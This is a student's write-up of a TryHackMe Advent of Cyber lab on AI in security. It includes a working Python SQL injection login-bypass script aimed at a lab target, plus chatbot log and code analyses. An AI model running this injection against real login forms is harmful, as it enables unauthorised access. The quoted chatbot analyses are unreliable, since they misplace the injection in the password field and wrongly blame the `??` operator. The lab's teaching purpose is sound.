# Day 4: AI in Security - old sAInt nick
Here is the [Link to room ](https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB)
### Purpose of the room: 
Highlight ways AI can be used in a cybersecurity context, while also knowing what to keep in mind when using AI for such tasks


### Benefits of AI in Cybersecurity

| **Features of AI**               | **Cyber Security Relevance**                                                                                      |
| -------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| Processing large amounts of data | Analysing vast data from multiple types of sources. For example, system and network logs together.                |
| Behaviour analysis               | Tracking normal behaviour and activities over a period of time and flagging anything that is out of the ordinary. |
| Generative AI                    | Summarising or providing context behind a series of events.                                                       |

## Practical
Once your AttackBox is open, you will visit the link provided by THM to visit the AI chatbot
### Using AI for Red Teaming
The chatbot will give you this message, and you can just respond with "yes" 
![](attachments/Pasted%20image%2020251220005446.png)

The chatbot may take little while to generate a response, so just be patient. 

It describes a vulnerability existing due to not properly sanitizing user inputs on a login form, leaving the form exposed to SQL injection attacks. This means an attacker can bypass authentication with manipulated input by injecting malicious SQL code.

The chatbot then generates some code with this vulnerability and gives us instructions on what to do with it.

1. Open a terminal window
2. Use command ```nano scirpt.py``` to create the file
3. Paste the script
4. Save the file with `Ctrl + X`
	 - If done through the terminal,  press Y then Enter to save the script
		![](attachments/Pasted%20image%2020251220011156.png)
5. Run the script with command `python3 script.py` 
   ```
```python
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

Before running the script, ensure that where you see `MACHINE_IP` that you replace it with IP address

At this point it threw a Traceback error at me and said the connection timed out. I wasn't completely sure why, so I restarted the target machine to get a new IP address and I got the desired output.
![](attachments/Pasted%20image%2020251220013604.png)

We can see the flag `THM{SQLI_EXPLOIT}` for the second question that we need to answer in the room and we can also see a message saying we successfully logged in
![](attachments/Pasted%20image%2020251220014433.png)

If you want to see what the website actually looks like, you can go back into the python script, and copy the link. Only the highlighted part should be copied
![](attachments/Pasted%20image%2020251220014631.png)

Then you take the payload username and password from the script as well
![](attachments/Pasted%20image%2020251220014741.png)

Paste them in the login form and you should be brought to the page described in the output
![](attachments/Pasted%20image%2020251220014821.png)

![](attachments/Pasted%20image%2020251220014850.png)
### Using AI for Blue Teaming
This is all about having assistance for log analysis
The log to be analysed is below:
```
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"
```

The chatbot gives its analysis on the log
```
Log Entry:
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

---

### 1. Analysis of the Logs
- IP Address: The user is likely accessing the web server via IP 198.51.100.22.
- Time and Date: The attack occurred on 3 October 2025 at 09:03.
- URL: The user attempted to access the login.php page.
- Username: Alice was the username being tested.
- SQL Injection: The password parameter contains an SQL injection: "alice%27 OR 1=1 -- -". This indicates that the application was vulnerable to SQL injection, which can compromise user data.
- Importance: Logging such events helps identify potential vulnerabilities and ensures that security measures are in place to prevent similar attacks.

---

### 2. Log Analysis Summary
This log entry highlights a vulnerable web application where an SQL injection attack was attempted. By analyzing the logs, a blue team member can:
- Detect malicious activity and prioritize security improvements.
- Understand how to prevent similar attacks by implementing proper input validation and secure password handling.

Final Note: Logging is critical for identifying potential threats and reinforcing security practices. 
```
### Using AI for Software Development
The chatbot gives us short explanation to identify vulnerabilities in source code
```
php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

FORMATTING GUIDELINES:
- **Specific Vulnerability**: The code uses `??` to default to an empty string, which allows SQL injection if the input is used in a query.  
- **Why Vulnerable**: This approach is insecure because it doesn't validate or sanitize the input, allowing attackers to inject malicious SQL code.  
- **Best Practices**: Use prepared statements, parameterized queries, and validate input before storing.  
- **Tools and Techniques**: Use OWASP ZAP for testing, SQL map, or a code review tool like SonarQube.  

**Complete Showcase!**  
```